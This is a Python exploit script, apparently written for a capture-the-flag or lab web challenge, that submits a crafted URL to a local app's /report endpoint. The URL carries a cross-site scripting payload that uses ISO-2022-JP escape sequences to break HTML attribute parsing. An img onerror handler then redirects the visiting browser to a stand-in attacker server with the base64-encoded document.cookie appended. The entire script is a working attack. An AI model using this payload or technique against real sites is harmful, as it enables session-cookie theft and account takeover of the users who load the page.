import requests

# Set base URL and attacker server URL
BASE_URL = "http://127.0.0.1"
# Replace with your actual server
ATTACKER_SERVER = "https://your_attacker_server.com"

# Step 1: Make a GET request to search endpoint
search_response = requests.get(f"{BASE_URL}/search?search=test")
print("Search Response Status Code:", search_response.status_code)
print("Search Response Content:", search_response.text)

# Step 2: Prepare the payload for the POST request
# The payload includes the "url" param with the crafted injection
payload = {
    "url": f"{BASE_URL}/search?search=%3Ca%20id=%22%1b$B%22%3E%3C/a%3E%1b(B%3Ca%20id=%22%3E%3Cimg%20src=a%20onerror=window.location.href=`{ATTACKER_SERVER}/${{btoa(document.cookie)}}`%3E%22%3E%3C/a%3E%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B%1b$B%1b(B"
}

# Step 3: Make a POST request to the /report endpoint with the payload
report_response = requests.post(f"{BASE_URL}/report", data=payload)
print("Report Response Status Code:", report_response.status_code)
# print("Report Response Content:", report_response.text)
